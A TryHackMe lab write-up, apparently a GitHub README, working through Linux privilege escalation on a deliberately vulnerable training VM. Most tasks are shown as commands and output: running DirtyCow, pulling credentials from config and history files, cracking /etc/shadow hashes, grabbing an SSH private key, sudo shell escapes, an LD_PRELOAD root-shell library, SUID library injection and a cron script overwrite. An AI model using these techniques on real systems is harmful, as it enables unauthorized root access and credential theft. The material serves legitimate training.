<h1 align="center">Linux PrivEsc Arena</h1>
<p align="center">Jun 8 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure,<br>
part of my 397-day-streak in  <a href="https://tryhackme.com">TryHackMe</a><br>
Students will learn how to escalate privileges using a very vulnerable Linux VM. SSH is open. Your credentials are TCM:Hacker123 <a href="https://tryhackme.com/room/linuxprivescarena"</a>here.<br><br>
<img width="1000px" src="https://github.com/user-attachments/assets/94b9a480-2895-4126-92c1-b114a5de092c"></p>
  
<br>

<h2>Task 3 . Privilege Escalation - Kernel Exploits</h2>

<h3 align="left">Answer the question below</h3>

> 3.1. <em>What is the user flag?</em><br><a id='3.1'></a>
>> <strong><code>No answer needed</code></strong><br>


```bash
:~# ssh TCM@10.10.254.19
...
TCM@debian:~/tools/linux-exploit-suggester$ ./linux-exploit-suggester.sh

Kernel version: 2.6.32
Architecture: x86_64
Distribution: debian
Package list: from current OS

Possible Exploits:

[+] [CVE-2010-3301] ptrace_kmod2

   Details: https://www.exploit-db.com/exploits/15023/
   Tags: debian=6,ubuntu=10.04|10.10
   Download URL: https://www.exploit-db.com/download/15023

[+] [CVE-2010-1146] reiserfs

   Details: https://www.exploit-db.com/exploits/12130/
   Tags: ubuntu=9.10
   Download URL: https://www.exploit-db.com/download/12130

[+] [CVE-2010-2959] can_bcm

   Details: https://www.exploit-db.com/exploits/14814/
   Tags: ubuntu=10.04
   Download URL: https://www.exploit-db.com/download/14814

[+] [CVE-2010-3904] rds

   Details: http://www.securityfocus.com/archive/1/514379
   Tags: debian=6,ubuntu=10.10|10.04|9.10,fedora=16
   Download URL: https://www.exploit-db.com/download/15285

[+] [CVE-2010-3848,CVE-2010-3850,CVE-2010-4073] half_nelson

   Details: https://www.exploit-db.com/exploits/17787/
   Tags: ubuntu=10.04|9.10
   Download URL: https://www.exploit-db.com/download/17787

[+] [CVE-2010-4347] american-sign-language

   Details: https://www.exploit-db.com/exploits/15774/
   Download URL: https://www.exploit-db.com/download/15774

[+] [CVE-2010-3437] pktcdvd

   Details: https://www.exploit-db.com/exploits/15150/
   Tags: ubuntu=10.04
   Download URL: https://www.exploit-db.com/download/15150

[+] [CVE-2010-3081] video4linux

   Details: https://www.exploit-db.com/exploits/15024/
   Tags: RHEL=5
   Download URL: https://www.exploit-db.com/download/15024

[+] [CVE-2012-0056,CVE-2010-3849,CVE-2010-3850] full-nelson

   Details: http://vulnfactory.org/exploits/full-nelson.c
   Tags: ubuntu=9.10|10.04|10.10,ubuntu=10.04.1
   Download URL: http://vulnfactory.org/exploits/full-nelson.c

[+] [CVE-2013-2094] perf_swevent

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: RHEL=6,ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/26131

[+] [CVE-2013-2094] perf_swevent 2

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: ubuntu=12.04
   Download URL: https://cyseclabs.com/exploits/vnik_v1.c

[+] [CVE-2013-0268] msr

   Details: https://www.exploit-db.com/exploits/27297/
   Download URL: https://www.exploit-db.com/download/27297

[+] [CVE-2013-2094] semtex

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: RHEL=6
   Download URL: https://www.exploit-db.com/download/25444

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40616

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Tags: ubuntu=16.04
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2009-1185] udev

   Details: https://www.exploit-db.com/exploits/8572/
   Tags: ubuntu=8.10|9.04
   Download URL: https://www.exploit-db.com/download/8572
   Comments: Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed 

[+] [CVE-2009-1185] udev 2

   Details: https://www.exploit-db.com/exploits/8478/
   Download URL: https://www.exploit-db.com/download/8478
   Comments: SSH access to non privileged user is needed. Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed

[+] [CVE-2010-0832] PAM MOTD

   Details: https://www.exploit-db.com/exploits/14339/
   Tags: ubuntu=9.10|10.04
   Download URL: https://www.exploit-db.com/download/14339
   Comments: SSH access to non privileged user is needed

[+] [CVE-2016-1247] nginxed-root.sh

   Details: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
   Tags: debian=8,ubuntu=14.04|16.04|16.10
   Download URL: https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh
   Comments: Rooting depends on cron.daily (up to 24h of dealy). Affected: deb8: <1.6.2; 14.04: <1.4.6; 16.04: 1.10.0

TCM@debian:~/tools/linux-exploit-suggester:
...
TCM@debian:~/tools/dirtycow$ gcc -pthread c0w.c -o c0w
TCM@debian:~/tools/dirtycow$ ./c0w
                                
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, //usr/bin/passwd                          
     //    //                              
    ^^    ^^                               
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap 84577000

madvise 0

ptrace 0

TCM@debian:~/tools/dirtycow$ passwd
root@debian:/home/user/tools/dirtycow# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:/home/user/tools/dirtycow#  
```


![image](https://github.com/user-attachments/assets/44c497bf-d15a-404b-83fb-b3a97c50318c)


<br>

<h2>Task 4 . Privilege Escalation - Stored Passwords (Config Files)</h2>

<h3 align="left">Answer the questions below</h3>

> 4.1. <em>What password did you find?</em><br><a id='4.1'></a>
>> <strong><code>password321</code></strong><br>

> 4.2. <em>What password did you find?</em><br><a id='4.2'></a>
>> <strong><code>user</code></strong><br>


<p>auth-user-pass /etc/openvpn/auth.txt</p>

```bash
TCM@debian:~$  cat /home/user/myvpn.ovpn
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

TCM@debian:~$ cat /etc/openvpn/auth.txt
user
password321
TCM@debian:~$ cat /home/user/.irssi/config | grep -i passw
    autosendcmd = "/msg nickserv identify password321 ;wait 2000";
```

<br>

<h2>Task 5 . Privilege Escalation - Stored Passwords (History)</h2>

<h3 align="left">Answer the questions below</h3>

> 5.1. <em>What was TCM trying to log into?</em><br><a id='5.1'></a>
>> <strong><code>mysql</code></strong><br>

> 5.2. <em>Who was TCM trying to log in as?</em><br><a id='5.2'></a>
>> <strong><code>root</code></strong><br>

> 5.3. <em>Naughty naughty.  What was the password discovered?</em><br><a id='5.3'></a>
>> <strong><code>password123</code></strong><br>

```bash
TCM@debian:~$  cat ~/.bash_history | grep -i passw
mysql -h somehost.local -uroot -ppassword123
cat /etc/passwd | cut -d: -f1
awk -F: '($3 == "0") {print}' /etc/passwd
passwd
TCM@debian:~$ 
```


<br>

<h2>Task 6 . Privilege Escalation - Weak File Permissions</h2>

<h3 align="left">Answer the question below</h3>

> 6.1. <em>What were the file permissions on the /etc/shadow file?</em><br><a id='6.1'></a>
>> <strong><code>-rw-rw-r--</code></strong><br>

<p>-rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow</p>

```bash
TCM@debian:~$ ls -la /etc/shadow
-rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow
TCM@debian:~$  cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
statd:x:103:65534::/var/lib/nfs:/bin/false
TCM:x:1000:1000:user,,,:/home/user:/bin/bash
TCM@debian:~$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:18431:0:99999:7:::
TCM@debian:~$ 
```

```bash
:~# cat unshadowed
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/bin/sh
bin:*:2:2:bin:/bin:/bin/sh
sys:*:3:3:sys:/dev:/bin/sh
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/bin/sh
man:*:6:12:man:/var/cache/man:/bin/sh
lp:*:7:7:lp:/var/spool/lpd:/bin/sh
mail:*:8:8:mail:/var/mail:/bin/sh
news:*:9:9:news:/var/spool/news:/bin/sh
uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:*:13:13:proxy:/bin:/bin/sh
www-data:*:33:33:www-data:/var/www:/bin/sh
backup:*:34:34:backup:/var/backups:/bin/sh
list:*:38:38:Mailing List Manager:/var/list:/bin/sh
irc:*:39:39:ircd:/var/run/ircd:/bin/sh
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:!:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:!:101:103::/var/spool/exim4:/bin/false
sshd:*:102:65534::/var/run/sshd:/usr/sbin/nologin
statd:*:103:65534::/var/lib/nfs:/bin/false
TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:1000:1000:user,,,:/home/user:/bin/bash
```

```bash
:~# hashcat -m 1800 unshadowed  rockyou.txt --show
Hashfile 'unshadowed' on line 2 (daemon:*:1:1:daemon:/usr/sbin:/bin/sh): Token length exception
Hashfile 'unshadowed' on line 3 (bin:*:2:2:bin:/bin:/bin/sh): Token length exception
Hashfile 'unshadowed' on line 4 (sys:*:3:3:sys:/dev:/bin/sh): Token length exception
Hashfile 'unshadowed' on line 5 (sync:*:4:65534:sync:/bin:/bin/sync): Token length exception
Hashfile 'unshadowed' on line 6 (games:*:5:60:games:/usr/games:/bin/sh): Token length exception
Hashfile 'unshadowed' on line 7 (man:*:6:12:man:/var/cache/man:/bin/sh): Token length exception
Hashfile 'unshadowed' on line 8 (lp:*:7:7:lp:/var/spool/lpd:/bin/sh): Token length exception
Hashfile 'unshadowed' on line 9 (mail:*:8:8:mail:/var/mail:/bin/sh): Token length exception
Hashfile 'unshadowed' on line 10 (news:*:9:9:news:/var/spool/news:/bin/sh): Token length exception
Hashfile 'unshadowed' on line 11 (uucp:*...:10:uucp:/var/spool/uucp:/bin/sh): Token length exception
Hashfile 'unshadowed' on line 12 (proxy:*:13:13:proxy:/bin:/bin/sh): Token length exception
Hashfile 'unshadowed' on line 13 (www-da...:33:33:www-data:/var/www:/bin/sh): Token length exception
Hashfile 'unshadowed' on line 14 (backup...4:34:backup:/var/backups:/bin/sh): Token length exception
Hashfile 'unshadowed' on line 15 (list:*...g List Manager:/var/list:/bin/sh): Token length exception
Hashfile 'unshadowed' on line 16 (irc:*:39:39:ircd:/var/run/ircd:/bin/sh): Token length exception
Hashfile 'unshadowed' on line 17 (gnats:...m (admin):/var/lib/gnats:/bin/sh): Token length exception
Hashfile 'unshadowed' on line 18 (nobody...5534:nobody:/nonexistent:/bin/sh): Token length exception
Hashfile 'unshadowed' on line 19 (libuui...00:101::/var/lib/libuuid:/bin/sh): Token length exception
Hashfile 'unshadowed' on line 20 (Debian...103::/var/spool/exim4:/bin/false): Token length exception
Hashfile 'unshadowed' on line 21 (sshd:*...:/var/run/sshd:/usr/sbin/nologin): Token length exception
Hashfile 'unshadowed' on line 22 (statd:...3:65534::/var/lib/nfs:/bin/false): Token length exception
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:password123
```

<br>

<h2>Task 7 . Privilege Escalation - SSH Keys</h2>
<h3 align="left">Answer the question below</h3>

> 7.1. <em>What's the full file path of the sensitive file you discovered?</em><br><a id='7.1'></a>
>> <strong><code>/backups/supersecretkeys/id_rsa</code></strong><br>

```bash
TCM@debian:~$ find / -name authorized_keys 2> /dev/null
TCM@debian:~$ find / -name id_rsa 2> /dev/null
/backups/supersecretkeys/id_rsa
TCM@debian:~$
```

<br>

<h2>Task 7 . Privilege Escalation - SSH Keys</h2>

<h3 align="left">Answer the question below</h3>

> 7.1. <em>What's the full file path of the sensitive file you discovered?</em><br><a id='7.1'></a>
>> <strong><code>/backups/supersecretkeys/id_rsa</code></strong><br>

```bash
TCM@debian:~$ find / -name authorized_keys 2> /dev/null
TCM@debian:~$ find / -name id_rsa 2> /dev/null
/backups/supersecretkeys/id_rsa
TCM@debian:~$ cat /backups/supersecretkeys/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAzSWvqfxeIpTuFmdAFyWDQho0h8ud3g9zSJ32pjosNcTQJe3/kYC4
B5hMlfIXzH5oKn9YRn55O10RYxppZpXFsc4H7pYquD5TLKLmaH7UqBj9X1WjGeZLexx+f2
...
```

```bash
root@ip-10-10-66-139:~# nano id_rsa
root@ip-10-10-66-139:~# chmod 400 id_rsa
root@ip-10-10-66-139:~# ssh -i id_rsa root@10.10.254.19
...
Last login: Wed Jun 17 23:31:40 2020 from 192.168.4.51
root@debian:~#
```

<br>

<h2>Task 8 . Privilege Escalation - Sudo (Shell Escaping)</h2>

<h3 align="left">Answer the question below</h3>

> 8.1. <em>Click 'Completed' once you have successfully elevated the machine</em><br><a id='8.1'></a>
>> <strong><code>No answer needed</code></strong><br>

```bash
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
TCM@debian:~$ sudo find /bin -name nano -exec /bin/sh \;
sh-4.1# whoami
root
sh-4.1# 
```

<br>

<h2>Task 9 . Privilege Escalation - Sudo (Abusing Intended Functionality)</h2>

<h3 align="left">Answer the question below</h3>

> 9.1. <em>Click 'Completed' once you have successfully elevated the machine</em><br><a id='9.1'></a>
>> <strong><code>No answer needed</code></strong><br>

```bash
sh-4.1# exit
exit
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
TCM@debian:~$ sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
TCM@debian:~$ 
```

```bash
root@ip-10-10-66-139:~# echo 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::' > hash.txt
root@ip-10-10-66-139:~# cat hash.txt
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
root@ip-10-10-66-139:~# john --wordlist=rockyou.txt hash.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (root)
1g 0:00:00:02 DONE (2025-06-08 01:12) 0.3496g/s 537.0p/s 537.0c/s 537.0C/s cuties..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
root@ip-10-10-66-139:~# john hash.txt --show
root:password123:17298:0:99999:7:::

1 password hash cracked, 0 left
```

![image](https://github.com/user-attachments/assets/cbd147c0-056b-4a19-9316-5c110868733f)

<br>

<h2>Task 10 . Privilege Escalation - Sudo (LD_PRELOAD)</h2>

<h3 align="left">Answer the question below</h3>

> 10.1. <em>Click 'Completed' once you have successfully elevated the machine</em><br><a id='10.1'></a>
>> <strong><code>No answer needed</code></strong><br>

```bash
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

![image](https://github.com/user-attachments/assets/3eff2a3a-0694-4ce4-a734-85fec44d8455)


```bash
TCM@debian:~$ cat x.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
TCM@debian:~$ gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user# 
```

<br>

<h2>Task 11 . Privilege Escalation - SUID (Shared Object Injection)</h2>

<h3 align="left">Answer the question below</h3>

> 11.1. <em>Click 'Completed' once you have successfully elevated the machine</em><br><a id='11.1'></a>
>> <strong><code>No answer needed</code></strong><br>

```bash
root@debian:/home/user# exit
exit
apache2: bad user name ${APACHE_RUN_USER}
TCM@debian:~$ find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18  2020 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
TCM@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
TCM@debian:~$ 
```

![image](https://github.com/user-attachments/assets/60936d26-4951-4d15-9b46-a3d085206dc1)

```bash
TCM@debian:~/.config$ nano libcalc.c
TCM@debian:~/.config$ gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
TCM@debian:~/.config$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1#
```


<br>

<h2>Task 12 . Privilege Escalation - SUID (Symlinks)</h2>

<h3 align="left">Answer the questions below</h3>

> 12.1. <em>What CVE is being exploited in this task?</em><br><a id='12.1'></a>
>> <strong><code>CVE-2016-1247</code></strong><br>

![image](https://github.com/user-attachments/assets/6768761c-0772-498f-8ce2-3a6e5d2593bf)

![image](https://github.com/user-attachments/assets/48a5cbe0-a477-4af1-bfe2-90c0ee505566)

> 12.2. <em>What binary is SUID enabled and assists in the attack?</em><br><a id='12.2'></a>
>> <strong><code>sudo</code></strong><br>

![image](https://github.com/user-attachments/assets/40d961ec-5132-4453-adff-8b02b3c21f04)

<br>

<h2>Task 13 . Privilege Escalation - SUID (Environment Variables #1)</h2>

<h3 align="left">Answer the question below</h3>

> 13.1. <em>What is the last line of the "strings /usr/local/bin/suid-env" output?</em><br><a id='13.1'></a>
>> <strong><code>service apache2 start</code></strong><br>

![image](https://github.com/user-attachments/assets/6a20b719-7dbc-425a-8138-37969805461e)

![image](https://github.com/user-attachments/assets/56519cff-37b1-46ac-8205-7e0047c6e265)

![image](https://github.com/user-attachments/assets/f674f2d2-3b2c-43c6-b22e-4bab7a382102)

<br>

<h2>Task 14 . Privilege Escalation - SUID (Environment Variables #2)</h2>

<h3 align="left">Answer the question below</h3>

> 14.1. <em>What is the last line of the "strings /usr/local/bin/suid-env2" output?</em><br><a id='14.1'></a>
>> <strong><code>/usr/sbin/service apache2 start</code></strong><br>

![image](https://github.com/user-attachments/assets/87839f80-9192-4d67-80ea-00c8afcbe715)

![image](https://github.com/user-attachments/assets/857f0097-8d52-4a93-ac4b-b3a3a1431a04)

![image](https://github.com/user-attachments/assets/b69f7e86-bdcf-4106-bf8f-7616bdab1fe0)

<br>

<h2>Task 15 . Privilege Escalation - Cron (Path)</h2>

<h3 align="left">Answer the question below</h3>

> 15.1. <em>Click 'Completed' once you have successfully elevated the machine</em><br><a id='15.1'></a>
>> <strong><code>No answer needed</code></strong><br>

```bash
TCM@debian:/home$ getcap -r / 2>/dev/null
...
TCM@debian:/home$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@debian:/home# 
```

<br>

<h2>Task 16 . Privilege Escalation - Cron (Path)</h2>

<h3 align="left">Answer the question below</h3>

> 16.1. <em>Click 'Completed' once you have successfully elevated the machine</em><br><a id='16.1'></a>
>> <strong><code>No answer needed</code></strong><br>

![image](https://github.com/user-attachments/assets/7c670c15-9afa-425c-bd0a-70848e0bd179)

![image](https://github.com/user-attachments/assets/f88d00e1-0f32-4fa5-8765-4ea8bfdcc64e)

<br>

<h2>Task 17 . Privilege Escalation - Cron (Wildcards)</h2>

<h3 align="left">Answer the question below</h3>

> 17.1. <em>Click 'Completed' once you have successfully elevated the machine</em><br><a id='17.1'></a>
>> <strong><code>No answer needed</code></strong><br>

![image](https://github.com/user-attachments/assets/b182cb72-7e9e-48fe-8a2e-cfbd0e7b03bd)

![image](https://github.com/user-attachments/assets/1c66c1f0-1945-45e8-8c51-b13d540b9ce7)

![image](https://github.com/user-attachments/assets/290b1bcd-646c-480f-a09b-ed0cab9e376e)

<br>

<h2>Task 18 . Privilege Escalation - Cron (File Overwrite)</h2>

<h3>Detection</h3>

<p>Linux VM<br>

1. In command prompt type: <code>cat /etc/crontab</code><br>
2. From the output, notice the script “overwrite.sh”<br>
3. In command prompt type: <code>ls -l /usr/local/bin/overwrite.sh</code><br>
4. From the output, notice the file permissions.</p>

<h3>Exploitation</h3>

<p>Linux VM<br>

1. In command prompt type: <code>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh</code><br>
2. Wait 1 minute for the Bash script to execute.<br>
3. In command prompt type: <code>/tmp/bash -p</code><br>
4. In command prompt type: <code>id</code></p>

<h3 align="left">Answer the question below</h3>

> 18.1. <em>Click 'Completed' once you have successfully elevated the machine</em><br><a id='18.1'></a>
>> <strong><code>No answer needed</code></strong><br>

![image](https://github.com/user-attachments/assets/aee61937-f332-4172-bbff-e7f70db7fbd6)

![image](https://github.com/user-attachments/assets/4bd5020f-cdf5-456f-9705-6270cf1bbf7a)


<br>

<h2>Task 19 . Privilege Escalation - NFS Root Squashing</h2>

<h3>Detection</h3>

<p>Linux VM<br>

1. In command line type: <code>cat /etc/exports</code><br>
